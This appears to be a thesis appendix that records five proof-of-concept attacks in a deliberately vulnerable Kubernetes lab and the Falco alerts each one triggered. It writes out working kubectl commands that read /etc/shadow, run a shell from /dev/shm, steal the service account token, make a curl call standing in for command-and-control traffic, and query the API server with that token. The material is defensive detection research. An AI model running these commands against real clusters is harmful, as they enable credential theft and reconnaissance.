PoC 1 — Sensitive File Access
----------------------------------------------------------------
MITRE: T1003 — OS Credential Dumping
Rule tag: T1555 (community rule tag; the thesis follows T1003)
Falco Rule: "Read sensitive file untrusted" (community)
Priority: Warning
Evidence: falco-attack2-sensitive-file-shadow.png

Command:
  kubectl exec -n default \
    $(kubectl get pod -n default -l app=health-check \
    -o jsonpath='{.items[0].metadata.name}') \
    -- cat /etc/shadow

What it does:
  Reads /etc/shadow, which holds the password hashes an attacker
  would take for offline cracking. The read succeeds only because
  the container runs as root. It is the image's own /etc/shadow,
  not the node's, so this is a detection baseline rather than a
  compromise of host credentials.

Falco Alert:
  20:07:31.865517795: Warning Sensitive file opened for reading
  by non-trusted program
  file=/etc/shadow | process=cat | proc.exepath=/usr/bin/cat
  parent=containerd-shim | command=cat /etc/shadow
  user=root | user.uid=0
  container_id=d316001c9c96 | container_name=health-check
  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
  k8s_pod_name=health-check-deployment-764f9d7654-v2xzh

PoC 2 — Fileless Execution from /dev/shm
----------------------------------------------------------------
MITRE: T1620 — Reflective Code Loading
Rule tag: T1059.004 (community rule tag; the thesis follows T1620)
Falco Rule: "Execution from /dev/shm" (community)
Priority: Warning
Evidence: falco-attack1-devshm-execution.png

Command:
  kubectl exec -n default \
    $(kubectl get pod -n default -l app=health-check \
    -o jsonpath='{.items[0].metadata.name}') \
    -- sh -c "cp /bin/sh /dev/shm/evil && /dev/shm/evil -c 'id'"

What it does:
  Copies a shell binary to /dev/shm (tmpfs, backed by memory) and
  executes it from there. It returns
  uid=0(root) gid=0(root) groups=0(root), and no file appears on
  the container's writable overlay layer.

Falco Alert:
  20:05:46.763967848: Warning File execution detected from /dev/shm
  proc.cmdline=sh -c "cp /bin/sh /dev/shm/evil && /dev/shm/evil -c 'id'"
  process=evil | proc.exepath=/dev/shm/evil
  parent=sh | command=evil -c id
  exe_flags=EXE_WRITABLE
  user=root | user.uid=0
  container_id=d316001c9c96 | container_name=health-check
  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
  k8s_pod_name=health-check-deployment-764f9d7654-v2xzh
  k8s_ns_name=default
  tags: T1059.004, mitre_execution

PoC 3 — Service Account Token Theft
----------------------------------------------------------------
MITRE: T1528 — Steal Application Access Token
Rule tag: T1528
Falco Rule: "Read Kubernetes Service Account Token" (CUSTOM,
            falco/custom-rules.yaml)
Priority: Warning
Evidence: falco-attack3-serviceaccount-token.png

Command:
  kubectl exec -n default \
    $(kubectl get pod -n default -l app=health-check \
    -o jsonpath='{.items[0].metadata.name}') \
    -- sh -c "cat /run/secrets/kubernetes.io/serviceaccount/token"

What it does:
  Reads the Kubernetes service account token (a JWT of about 900
  characters) that the platform mounts into every pod by default.
  The token itself is not reproduced here. No community rule
  matches this action; without the custom rule it would produce
  no alert at all.

Falco Alert:
  21:01:35.785496162: Warning Service account token read
  user=root | process=cat
  file=/run/secrets/kubernetes.io/serviceaccount/token
  pod=health-check-deployment-764f9d7654-v2xzh | ns=default
  container_id=d316001c9c96 | container_name=health-check
  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
  tags: T1528, mitre_credential_access

PoC 4 — Command-and-Control Communication (curl)
----------------------------------------------------------------
MITRE: T1071.001 — Application Layer Protocol: Web Protocols
Rule tag: T1105 (custom rule tag; the thesis follows T1071.001,
          because this scenario transfers no tool)
Falco Rule: "Detect curl or wget inside container" (CUSTOM,
            falco/custom-rules.yaml)
Priority: Warning
Evidence: falco-attack4-curl-c2.png

Command:
  kubectl exec -n default \
    $(kubectl get pod -n default -l app=health-check \
    -o jsonpath='{.items[0].metadata.name}') \
    -- sh -c "curl -s http://example.com"

What it does:
  Makes an outbound HTTP request with curl, representative of
  traffic to external command-and-control infrastructure. The
  request succeeds, so the container can reach arbitrary external
  hosts. The rule is process-based (proc.name in (curl, wget)):
  the same request made with another HTTP client or bash's
  /dev/tcp would not match it.

Falco Alert:
  21:02:17.885919289: Warning Network tool execution in container
  user=root | process=curl | command=curl -s http://example.com
  pod=health-check-deployment-764f9d7654-v2xzh | ns=default
  container_id=d316001c9c96 | container_name=health-check
  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
  tags: T1105, mitre_command_and_control

PoC 5 — Kubernetes API Discovery with the stolen token
----------------------------------------------------------------
MITRE: T1613 — Container and Resource Discovery
Rule tag: not recorded
Falco Rule: "Contact K8S API Server From Container" (community)
            The PoC 3 and PoC 4 custom rules also fire, because the
            command uses cat and curl.
Priority: Notice
Evidence: falco-attack5-k8s-api-lateral-movement.png

Command:
  kubectl exec -n default \
    $(kubectl get pod -n default -l app=health-check \
    -o jsonpath='{.items[0].metadata.name}') \
    -- sh -c '
      TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
      curl -sk -H "Authorization: Bearer $TOKEN" \
        https://kubernetes.default.svc/api/v1/namespaces/
    '

What it does:
  Uses the token from PoC 3 to ask the Kubernetes API what it is
  allowed to do (list all namespaces). The API server answers,
  but with an authorisation failure:

  {
    "kind": "Status",
    "apiVersion": "v1",
    "status": "Failure",
    "message": "namespaces is forbidden: User
      \"system:serviceaccount:default:default\" cannot list
      resource \"namespaces\" in API group \"\" at the cluster scope",
    "reason": "Forbidden",
    "code": 403
  }

  The contact with the API server is detected, but no resources
  were enumerated: Kubernetes RBAC, which is outside the four
  layers evaluated in the thesis, refused the request.

Falco Alert:
  21:05:58.784373966: Notice Unexpected connection to K8S API
  Server from container
  connection=10.244.0.29:34210->10.96.0.1:443
  proc.exepath=/usr/bin/curl | process=curl | parent=sh
  user=root | user.uid=0
  container_id=d316001c9c96 | container_name=health-check
  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
